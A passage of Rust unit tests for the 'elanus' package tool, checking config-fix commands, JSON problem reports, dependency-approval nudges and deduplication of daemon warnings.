        // to config_repo::set_key(pkg, key, value). A malformed (e.g. dotted) fix
        // would mis-parse here and fail the test rather than pass unexercised.
        let cfg_fix = r
            .problems
            .iter()
            .find(|p| p.kind == ProblemKind::ConfigKeyUnset)
            .expect("a config problem to remediate")
            .fix
            .clone();
        let toks: Vec<&str> = cfg_fix.split_whitespace().collect();
        assert_eq!(
            &toks[..3],
            &["elanus", "config", "set"],
            "the config fix is a `config set` command: {cfg_fix}"
        );
        // Exactly three positionals follow `set`: <pkg> <key> <value-placeholder>.
        assert_eq!(toks.len(), 6, "config set takes three space-separated args: {cfg_fix}");
        assert_eq!(toks[3], "telegram");
        assert_eq!(toks[4], "TELEGRAM_TOKEN");
        crate::config_repo::init(&root).unwrap();
        crate::config_repo::set_key(&root, toks[3], toks[4], "\"123:abc\"").unwrap();
        let r3 = validate(&root, &conn, "default").unwrap();
        assert!(r3.is_ok(), "all fixes applied → valid: {:?}", r3.problems);

        // JSON shape is machine-stable: each item carries package/kind/message/
        // fix/recheck (+ requires? for package deps).
        let r0 = validate(&root, &conn, "default").unwrap();
        let _ = r0; // valid now
        // Re-derive a failing report for JSON assertions.
        let root2 = scratch_root("report-json");
        write_pkg(&root2, "recall2", "[requires]\npackages = [\"phonebook2\"]\n");
        write_pkg(
            &root2,
            "phonebook2",
            "[request]\nsubscribe = [\"in/package/phonebook2/x\"]\n",
        );
        let conn2 = db::open(&root2).unwrap();
        db::init_schema(&conn2).unwrap();
        sync(&root2, &conn2).unwrap();
        let jr = validate(&root2, &conn2, "default").unwrap();
        let js = jr.to_json();
        assert_eq!(js["ok"], serde_json::Value::Bool(false));
        assert_eq!(js["recheck"], "elanus packages check --profile default");
        let item = &js["problems"][0];
        assert_eq!(item["package"], "recall2");
        assert_eq!(item["requires"], "phonebook2");
        assert_eq!(item["kind"], "package_not_approved");
        assert_eq!(item["fix"], "elanus approve phonebook2");
        assert_eq!(item["recheck"], "elanus packages check --profile default");

        std::fs::remove_dir_all(&root.dir).ok();
        std::fs::remove_dir_all(&root2.dir).ok();
    }

    #[test]
    fn unmet_dep_nudges_after_approve() {
        // M4: approving a package whose dep is unapproved yields a nudge line
        // naming `elanus approve <dep>`; once the dep is approved, no nudge.
        let root = scratch_root("nudge");
        write_pkg(
            &root,
            "phonebook",
            "[request]\nsubscribe = [\"in/package/phonebook/x\"]\n",
        );
        write_pkg(&root, "recall", "[requires]\npackages = [\"phonebook\"]\n");
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        decide(&root, &conn, "recall", true, "test").unwrap();
        let nudges = unmet_dep_nudges(&root, &conn, "recall").unwrap();
        assert_eq!(nudges.len(), 1);
        assert!(
            nudges[0].contains("elanus approve phonebook"),
            "nudge names the dep fix: {}",
            nudges[0]
        );
        decide(&root, &conn, "phonebook", true, "test").unwrap();
        assert!(
            unmet_dep_nudges(&root, &conn, "recall").unwrap().is_empty(),
            "no nudge once the dep is approved"
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn warn_deps_if_changed_dedupes() {
        // M4: the daemon warn logs only when the problem set changes — the kv
        // signature suppresses a repeat on an unchanged state.
        let root = scratch_root("warn-dedupe");
        write_pkg(&root, "recall", "[requires]\npackages = [\"phonebook\"]\n");
        write_pkg(
            &root,
            "phonebook",
            "[request]\nsubscribe = [\"in/package/phonebook/x\"]\n",
        );
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        // First call records the signature; second is a no-op (same state).
        warn_deps_if_changed(&root, &conn, "default").unwrap();
        let sig1 = crate::db::kv_get(&conn, "deps_warn_sig:default").unwrap();
        assert!(sig1.is_some());
        warn_deps_if_changed(&root, &conn, "default").unwrap();
        let sig2 = crate::db::kv_get(&conn, "deps_warn_sig:default").unwrap();
        assert_eq!(sig1, sig2, "unchanged state keeps the same signature");
        // Fixing the problem changes the signature to empty.
        decide(&root, &conn, "phonebook", true, "test").unwrap();
        warn_deps_if_changed(&root, &conn, "default").unwrap();
        let sig3 = crate::db::kv_get(&conn, "deps_warn_sig:default").unwrap();
        assert_ne!(sig1, sig3, "resolving the problem changes the signature");
        std::fs::remove_dir_all(&root.dir).ok();
    }
}
